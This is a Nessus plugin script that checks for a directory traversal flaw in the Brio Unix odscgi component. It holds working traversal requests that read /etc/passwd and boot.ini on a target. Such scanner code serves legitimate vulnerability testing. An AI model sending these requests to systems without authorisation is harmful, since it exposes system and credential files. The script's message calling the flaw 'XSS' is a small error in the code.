#
# This script was written by fr0stman <fr0stman@sun-tzu-security.net>
#
# v. 1.00 (last update 02.09.03)
#
# This script is released under the GPLv2
#


include("compat.inc");

if(description)
{
 script_id(15849);
 script_name(english:"Brio Unix odscgi HTMLFile Parameter Traversal Arbitrary File Access");
 script_version("$Revision: 1.11 $");
 script_osvdb_id(50560);
 script_cvs_date("$Date: 2015/09/24 20:59:28 $");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"The Brio web application interface has a directory traversal 
in the component 'odscgi'. An attacker may exploit this flaw to read
arbitrary files on the remote host by submitting a URL like :

 http://www.example.com/ods-cgi/odscgi?HTMLFile=../../../../../../etc/passwd" );
 script_set_attribute(attribute:"solution", value:
"Check www.brio.com for updated software." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/11/30");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_summary(english:"Brio Unix Directory Traversal");

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2003-2015 Chris Foster");

 script_dependencies("http_version.nasl", "web_traversal.nasl");
 script_require_keys("Settings/ThoroughTests");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

if ( ! thorough_tests ) exit(0, "This script only runs in 'Thorought tests' mode");

port = get_http_port(default:80);
if ( !port ) exit(0);
if (get_kb_item(strcat("www/", port, "/generic_traversal")))
 exit(0, "The web server on port "+port+" is vulnerable to XSS");

if(get_port_state(port))
{
rq = "/ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../etc/passwd";
req = http_get(item:rq, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if ( egrep(pattern:"root:.*:0:[01]:", string:res ) )
  security_warning(port: port, 
		extra: 'Nessus could read\n'+ build_url(port: port, qs: rq));

rq = "/ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../boot.ini";
req = http_get(item:rq, port:port);
res = http_keepalive_send_recv(port:port, data:req);
if ( "[operating systems]" >< res )
  security_warning(port: port, 
		extra: 'Nessus could read\n'+ build_url(port: port, qs: rq));
}
